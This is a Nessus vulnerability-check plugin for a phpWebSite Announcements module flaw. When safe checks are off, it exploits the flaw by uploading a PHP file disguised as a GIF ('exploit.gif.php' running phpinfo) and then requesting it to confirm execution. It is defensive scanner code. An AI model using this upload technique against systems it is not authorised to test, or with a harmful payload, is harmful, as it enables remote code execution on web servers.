#
# (C) Tenable Network Security
#
# 

  desc["english"] = "
The remote host is running a version of phpWebSite in which the
Announcements module allows a remote attacker to both upload PHP
scripts disguised as image files and later run them using the
permissions of the web server user. 

Solution : Upgrade to a version more recent than 0.10 once it becomes
available or uninstall the Announcements module.

Risk factor : High";


if(description) {
  script_id(17223);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(12653);

  name["english"] = "phpWebSite Arbitrary PHP File Upload as Image File Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Detects arbitrary PHP file upload as image file vulnerability in phpWebSite";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes", "http_version.nasl", "phpwebsite_detect.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/phpwebsite"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];

    url = "/index.php";
    url_args = "module=announce&ANN_user_op=submit_announcement";
    req = http_get(item:dir + url + "?" + url_args, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if ( res == NULL ) exit(0);

    # If file uploads are supported....
    if (egrep(pattern:'<input type="file" name="ANN_image"', string:res)) {

      # If safe_checks are enabled, rely on the version number alone.
      if (safe_checks()) {
        if (ereg(pattern:"^0\.(7\.3|[89]|10\.0)$", string:ver)) {
          security_hole(port);
          exit(0);
        }
      }
      # Otherwise, try to exploit it.
      else {
        #  Grab the session cookie.
        pat = "Set-Cookie: (.+); path=";
        matches = egrep(pattern:pat, string:res, icase:TRUE);
        foreach match (split(matches)) {
          match = chomp(match);
          cookie = eregmatch(pattern:pat, string:match);
          if (cookie == NULL) break;
          cookie = cookie[1];
        }

        # Open a ticket as long as we have a session cookie.
        if (cookie) {
          boundary = "bound";
          req = string(
            "POST ",  dir, url, " HTTP/1.1\r\n",
            "Host: ", get_host_name(), "\r\n",
            "Cookie: ", cookie, "\r\n",
            "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
            # nb: we'll add the Content-Length header and post data later.
          );
          boundary = string("--", boundary);
          postdata = string(
            boundary, "\r\n", 
            'Content-Disposition: form-data; name="module"', "\r\n",
            "\r\n",
            "announce\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="ANN_user_op"', "\r\n",
            "\r\n",
            "save\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="ANN_subject"', "\r\n",
            "\r\n",
            "Image Upload Test\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="ANN_summary"', "\r\n",
            "\r\n",
            "Image uploads are possible!\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="ANN_body"', "\r\n",
            "\r\n",
            "See attached image.\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="ANN_image"; filename="exploit.gif.php"', "\r\n",
            "Content-Type: image/gif\r\n",
            "\r\n",
            # NB: This is the actual exploit code; you could put pretty much
            #     anything you want here.
            "<? phpinfo() ?>\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="ANN_alt"', "\r\n",
            "\r\n",
            "empty\r\n",

            boundary, "--", "\r\n"
          );
          req = string(
            req,
            "Content-Length: ", strlen(postdata), "\r\n",
            "\r\n",
            postdata
          );
          res = http_keepalive_send_recv(port:port, data:req);
          if (res == NULL) exit(0);           # can't connect

          # Run the attachment we just uploaded.
          url = string(dir, "/images/announce/exploit.gif.php");
          req = http_get(item:url, port:port);
          res = http_keepalive_send_recv(port:port, data:req);
          if (res == NULL) exit(0);           # can't connect

          # If we could run it, there's a problem.
          if (egrep(pattern:"PHP Version", string:res, icase:TRUE)) {
            desc = str_replace(
              string:desc["english"],
              find:"Solution :",
              replace:string(
                "**** Nessus has successfully exploited this vulnerability by uploading\n",
                "**** an image file with PHP code that reveals information about the\n",
                "**** PHP configuration on the remote host. The file is located under\n",
                "**** the web server's document directory as:\n",
                "****          ", dir, "/images/announce/exploit.gif.php\n",
                "**** You are strongly encouraged to delete this attachment as soon as\n",
                "**** possible as it can be run by anyone who accesses it remotely.\n",
                "\n",
                "Solution :"
              )
            );
            security_hole(port:port, data:desc);
            exit(0);
          }
        }
      }
    }
  }
}
